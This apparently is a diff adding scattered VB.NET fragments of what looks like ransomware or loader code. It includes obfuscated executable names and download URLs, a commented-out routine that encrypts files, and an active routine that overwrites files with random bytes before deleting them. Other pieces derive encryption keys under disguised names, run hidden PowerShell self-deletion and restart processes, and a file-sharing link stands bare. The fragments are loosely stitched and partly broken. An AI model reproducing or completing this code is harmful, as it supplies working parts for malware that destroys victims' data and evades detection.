@@ -1,0 +1,219 @@
+'Public Shared sEXEName As String() = {Obf("o40jw2iL4O420Z59LgH0Cw=="), Obf("O/VIjLasaFZUjff0/g65Yw=="), Obf("n1mKqZ+vurA="), Obf("qYO7p8GbBs0myB6aD84KHUASMOfK0CJ2"), _
+    '                                      Obf("Yb56MpFGpJzNA5NFrI13CA=="), Obf("9B3sjZwTXiOv+soOtIknYQ=="), Obf("+eHWZbBjaArLFutQfrCGKoXBVPEbyMe5K8Y4eRzzu4c="), _
+    '                                      Obf("VDWqWFUehfL7Ba815ACw2w=="), Obf("u0IH4+6AxHS+qPJsqy+hug=="), Obf("5SHt6kb0YcGGpvmYBv6mtQ=="), Obf("RYKhA+pf2tiV0Z5AdV6+6Q=="), _
+    '                                      Obf("X4dHxaNO6cPmfoSGDVBw6MOawjRnzcOO"), Obf("euASBzfkToTUr9aDvBbbixuS+mjb8YLJ"), Obf("wgZc+uauUmXkt5ezKzAXUA=="), Obf("nC7fT8enSsgrZRXWtd7gtQ=="), _
+    '                                      Obf("8xWGzmx0SrmI/TvIzfg10Q=="), Obf("mIgQZ8r4cFFvwIcEdLOUWHxqAyvFplAJ"), Obf("7d3ZQ36SIa7+AbfyyO/cqQ=="), Obf("vX+ktvHUwns="), Obf("DG1KrsD04WU0hfImHm20Dw==")}
+
+
+'Public Shared sUrl As String = Obf("CO0IMt0ENFkuhvRhdFtt8Go+L/sIMPMcA+6sAsDHzjlbjwGZAeARFejHIjNwgYWh9/Guwx6Oy7+fqPaQhKp8UFA4xa35iFC0IkbGpQ5C6WUIKNMP7JP8otUAbFNBl9S4")
+    'Public Shared sAlternUrl As String = Obf("CO0IMt0ENFkuhvRhdFtt8Cp+XDL58UKl3uGYiG1LkdvuYBQ1M+OpgayD84zePe96oTBynP7AVCNywnDJgEzY1+LgXEb6fJTaLJB43IBxYjQDfcOIvNc2n9E8wKI0ExGV")
+
+
+ ' Public Shared sFileName As String = Path.Combine(GEtSPecialFolder(Environment.SpecialFolder.LocalApplicationData), GetRandomName(False))
+
+
+
+https://gofile.io/?c=wiYs9s
+
+
+ Public Sub SecureDelete(ByVal sFilePath As String)
+        Try
+            Dim i As Integer
+            Dim bytBuffer As Byte()
+            Dim CurrentFile As New FileInfo(sFilePath)
+
+            ReDim bytBuffer(CurrentFile.Length)
+
+            For i = 0 To UBound(bytBuffer)
+                Randomize()
+                bytBuffer(i) = CByte((255 - 0) * Rnd())
+            Next
+
+            IO.File.WriteAllBytes(sFilePath, bytBuffer)
+            CurrentFile.Delete()
+            bytBuffer = Nothing
+        Catch ex As Exception
+        End Try
+
+    End Sub
+
+
+
+ 'Public Shared sUrl As String() = {Obf("CO0IMt0ENFkuhvRhdFtt8Go+L/sIMPMcA+6sAsDHzjlbjwGZAeARFejHIjNwgYWh9/Guwx6Oy7+fqPaQhKp8UFA4xa35iFC0IkbGpQ5C6WUIKNMP7JP8otUAbFNBl9S4"), _
+    '                                  Obf("CO0IMt0ENFkuhvRhdFtt8Cp+XDL58UKl3uGYiG1LkdvuYBQ1M+OpgayD84zePe96oTBynP7AVCNywnDJgEzY1+LgXEb6fJTaLJB43IBxYjQDfcOIvNc2n9E8wKI0ExGV")}
+
+
+
+
+Public Function Strip_Extension(ByVal filename As String) As String
+
+        Dim ext_array() As String
+        Dim file_index As Long
+
+        ext_array = Split(filename, ".")
+
+        If UBound(ext_array) > 0 Then ' check for "." extension
+            filename = ""
+            For file_index = 0 To UBound(ext_array) - 1 ' re create filename without .extension
+                If file_index < UBound(ext_array) - 1 Then
+                    filename = filename & ext_array(file_index) & "."
+                Else
+                    filename = filename & ext_array(file_index)
+                End If
+            Next
+        End If
+
+        Strip_Extension = filename
+
+    End Function
+
+
+
+
+Public Shared Function MessageBoxA(ByVal sPassword As String) As Byte()
+
+        Dim cData() As Char = sPassword.ToCharArray
+        Dim iLength As Integer = cData.GetUpperBound(0)
+        Dim bytDataToHash(iLength) As Byte
+
+        For i As Integer = 0 To cData.GetUpperBound(0)
+            bytDataToHash(i) = CByte(Asc(cData(i)))
+        Next
+
+        'Dim SHA512 As New System.Security.Cryptography.SHA512Managed
+        'Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
+        'Dim bytResult As Byte() = clsS.SecureHash512.ComputeHash(bytDataToHash)
+        Dim bytResult As Byte() = M_Main.InitSHA(bytDataToHash)
+        Dim bytKey(31) As Byte
+
+        For i As Integer = 0 To 31
+            bytKey(i) = bytResult(i)
+        Next
+
+        Return bytKey
+    End Function
+    Public Shared Function MessageBoxB(ByVal sPassword As String) As Byte()
+
+        Dim cData() As Char = sPassword.ToCharArray
+        Dim iLength As Integer = cData.GetUpperBound(0)
+        Dim bDataToHash(iLength) As Byte
+
+        For i As Integer = 0 To cData.GetUpperBound(0)
+            bDataToHash(i) = CByte(Asc(cData(i)))
+        Next
+
+        'Dim SHA512 As New System.Security.Cryptography.SHA512Managed
+        'Dim bytResult As Byte() = SHA512.ComputeHash(bDataToHash)
+        'Dim bytResult As Byte() = clsS.SecureHash512.ComputeHash(bDataToHash)
+        Dim bytResult As Byte() = M_Main.InitSHA(bDataToHash)
+        Dim bytIV(15) As Byte
+
+        For i As Integer = 32 To 47
+            bytIV(i - 32) = bytResult(i)
+        Next
+
+        Return bytIV
+    End Function
+
+
+
+
+
+
+
+
+
+'Public Shared Sub CryptOrchid(ByVal sIF As String, ByVal sOF As String, ByVal bytee() As Byte, ByVal byteee() As Byte)
+    '    Try
+    '        clsS.fsE = Getfstream(sIF, True)
+    '        clsS.fsS = Getfstream(sOF, False)
+    '        clsS.fsS.SetLength(0)
+
+
+    '        Dim lCounter As Long = 0
+    '        Dim lngFileLength As Long = clsS.fsE.Length
+    '        Dim iCounter As Integer
+    '        Dim bTempStore(clsS.iBufferSize) As Byte
+
+    '        clsS.csCs = M_Main.InitCrptStream(clsS.csCs, bytee, byteee)
+
+
+    '        While lCounter < lngFileLength
+    '            iCounter = clsS.fsE.Read(bTempStore, 0, clsS.iBufferSize)
+    '            clsS.csCs.Write(bTempStore, 0, iCounter)
+    '            lCounter = lCounter + CLng(iCounter)
+    '        End While
+
+    '        clsS.csCs.Close()
+    '        clsS.fsE.Close()
+    '        clsS.fsS.Close()
+
+    '        Dim UniqueInstance As New FileInfo(clsS.sFileToEncrypt)
+
+    '        'UniqueInstance.Delete()
+
+    '    Catch ex As UnauthorizedAccessException
+    '    Catch ex As AccessViolationException
+    '    Catch When Err.Number = clsS.FileNotFoundException
+    '    Catch exep As Exception
+
+    '        clsS.fsE.Close()
+    '        clsS.fsS.Close()
+    '        Dim InstanceToDel As New FileInfo(sIF)
+    '        'InstanceToDel.Delete()
+    '    End Try
+    'End Sub
+
+
+
+Function GetRandomName(Optional ByVal bShared = True) As String
+        On Error Resume Next
+        Randomize()
+        Return clsS.sSharedName.ElementAt(Int(Rnd() * 5)) & clsS.sSharedExtension.ElementAt(Int(Rnd() * 3)) : Exit Function
+        'If bShared = True Then Return clsS.sSharedName.ElementAt(Int(Rnd() * 5)) & clsS.sSharedExtension.ElementAt(Int(Rnd() * 3)) : Exit Function
+        'Return clsS.sEXEName.ElementAt(Int(Rnd() * 20)) & clsS.sExtension.ElementAt(Int(Rnd() * 2))
+    End Function
+
+
+
+'Dim PS As String = Obf("1I04sbsjCEHhDfEOigLE4xfz07slVs5Xy0ETzZPTOrc=") & "  " & _
+            '    Obf("oX2TupJZvXL83RBdBfD2FKRiwnr/yAj0dpC54ybmDuaBHUw/jUT9EaPNmswvsIJZkv84Sw1DIo5nemNEJuCZjn0ahUUMZGyeRKeuBRU0oNXDkE94L+YcSrYugsXim+FZDKd57WA4jBRVg8zZUOxrd4h2zk++CvFLsY59G3iL1OuvIIfM7/3en4dqGZDLU4sGFJcncy/CDaXTb0TUxLdj/D3tOcf3+wJskogU12MdKO2CR3mYEihSSH6eu2R2+jdynJZRYp+MVGqtW1eT2JUzr44iW5hEUJDAOR7l8Bq6t+ANanldcNVbyqq7AFJ8BgPv8InHQnz6WiNBXz+H933o72DrMC6Bu3gCsxMVsszWZhsmgC1oSKRBDsyj6Ys+4pIiDhpcr3pKVTjJ9FdUgZ44e/UZTQO/taL0P1w8SyvngRCPltNjGiC+FUbDQi4oifoadaBr7S8KusQjuXG3ibYzQwy1yhOJR3QjU8/M1rFPghXzD8wyweUwzxcFqDB8duymHlumfajxz/mQxCk/CdE8/rYaqR3X44whOMjybbL2R/NDGkwO3C7ym4yUQWRAlFnryqQ2WUNdjLtr5DB0Z25JwQ==")
+
+
+
+
+
+ 'Dim PS As String = Obf("1I04sbsjCEHhDfEOigLE4xfz07slVs5Xy0ETzZPTOrc=") & "  " & _
+            '    Obf("oX2TupJZvXL83RBdBfD2FKRiwnr/yAj0dpC54ybmDuaBHUw/jUT9EaPNmswvsIJZkv84Sw1DIo5nemNEJuCZjn0ahUUMZGyeRKeuBRU0oNXDkE94L+YcSrYugsXim+FZDKd57WA4jBRVg8zZUOxrd4h2zk++CvFLsY59G3iL1OuvIIfM7/3en4dqGZDLU4sGFJcncy/CDaXTb0TUxLdj/D3tOcf3+wJskogU12MdKO2CR3mYEihSSH6eu2R2+jdynJZRYp+MVGqtW1eT2JUzr44iW5hEUJDAOR7l8Bq6t+ANanldcNVbyqq7AFJ8BgPv8InHQnz6WiNBXz+H933o72DrMC6Bu3gCpIrHakChO5Q=") & _
+            '    Path.GetFileName(sFilePath) & Obf("Ok196Urxe23C557eUArz5IwfhJfV/cubO+fXZ6Uv52dFiNCK7ir/5VtliTLOZGXiUPi2d05F4s7kdDzHgy6Jqk8039hNoeqXaqSqs1wI58gKbWoRBPwWWCLEEO8G+VEvA/CTr/yEYNBiRdOaME+ghD9egFO0YUUQ/LATdDjhnd9bWP781ADBFgjoRFi0bjZe8ae4kJnwDcpkeEDUcKOgJA==")
+
+
+'Shell(PS, AppWinStyle.Hide, False, -1)
+
+
+
+
+
+
+
+'Try
+        '    Shell(Obf("1I04sbsjCEHhDfEOigLE4xfz07slVs5XQB9z7as9PqTw1jZyU1aj+etQsRZ3HlAnV2iMoraixq2vmaMSY6a2cg==") & _
+        '          " -s 1 ;Remove-Item –Path " & ShortPathName(Application.ExecutablePath.ToString), AppWinStyle.Hide, False, -1)
+        'Catch ex As Exception
+        'End Try
+
+
+
+
+"F9c3PYOk6EgsDD/IXpxUS7emZ04O3Bqm" & " -s 3;" & 
+
+ Public Sub RestartProcess(ByVal sProcessName As String)
+        Try
+            Dim PS As String = Obf("SgRXojj92hQ0ctBIs6ZOI338fqFILBTJCIupzKxFUpA=") + " " + _
+                Obf("w5CUcOAPEQD8vPohnJz/zM5C9I/5zhaLlXHXnwhjBPc=") + " " + sProcessName
+            RunPS(PS)
+        Catch ex As Exception
+        End Try
+
+
+    End Sub
